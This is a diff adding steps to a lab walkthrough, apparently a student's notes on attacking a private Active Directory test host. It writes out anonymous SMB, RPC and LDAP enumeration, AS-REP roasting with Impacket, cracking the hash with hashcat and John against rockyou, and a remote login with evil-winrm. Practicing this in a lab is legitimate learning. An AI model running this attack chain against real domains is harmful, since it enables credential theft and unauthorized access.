@@ -46,4 +46,60 @@ crackmapexec smb 192.168.56.107
 
 So after running bouth 4 scanns I learned that the 2 most usefull were nmap and Enum4linux-ng. 
 The scan revealed that the target is part of the SKYPIA domain, running Windows Server 2019 (or a similar OS version) with SMB signing required and modern SMB protocols supported (SMB 2.02 to SMB 3.1.1). However, access to detailed user, group, share, and policy information was mostly denied, indicating restricted permissions for unauthenticated sessin.
+We can pull donw users using ldap or msrpc
 
+# 8) running smbclient 
+
+smbclient -L 192.168.56.107 -U "" 
+For prottection I will have to setup so you cant log in anonymostly. At the moment when I run it I get acsses to the fileshare workgrop 
+
+# 9) rpcclient 
+
+rpcclient -N -U '' 192.168.56.107 
+-U is for user
+-N is for password ignore
+
+after we are in the rpcclient comand line we can run enumdomusers
+but we get permision denied.
+We get users now lets try:
+
+# ldapsearch
+First we need to get the domain naim if nmap did not output
+389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: skypia.or>
+it we can try:
+ldapsearch -H ldap://192.168.56.107 -x -s base namingcontext 
+
+after that we can run:
+ldapsearch -H ldap://192.168.56.107 -x -b"DC=skypia,DC=org" 
+
+we get some useful inforamtion like some account names...
+
+but we are after an objectClass(sAMAccountName):
+
+ldapsearch -H ldap://192.168.56.107 -x -b"DC=skypia,DC=org"  '(objectClass=User)' "sAMAccountName"| grep "sAMAccountName" 
+
+We got the same usernames as we would get if ldapsearc would not be protected
+
+# 10) running Impacket and then hashcat on the hashes of the password
+
+impacket-GetNPUsers -dc-ip 192.168.56.107 -request 'skypia.org/'
+
+First run sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+hashcat hash-jemmie.txt /usr/share/wordlists/rockyou.txt 
+
+after running we get the last word of hash(password) (winter) for jammie
+
+or you can use john the reaper so you are sure that the password is the same
+
+└─$ john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt poskus1.txt 
+
+# 11) rpcclient with the user and password now outputs other enumereted users that were hidden before
+
+└─$ rpcclient -U "jemmie.blondell" 192.168.56.107
+
+# 12) Log in with evil-winrm 
+
+└─$ evil-winrm -i 192.168.56.107 -u jemmie.blondell
+
+After the succest I could check users computer.
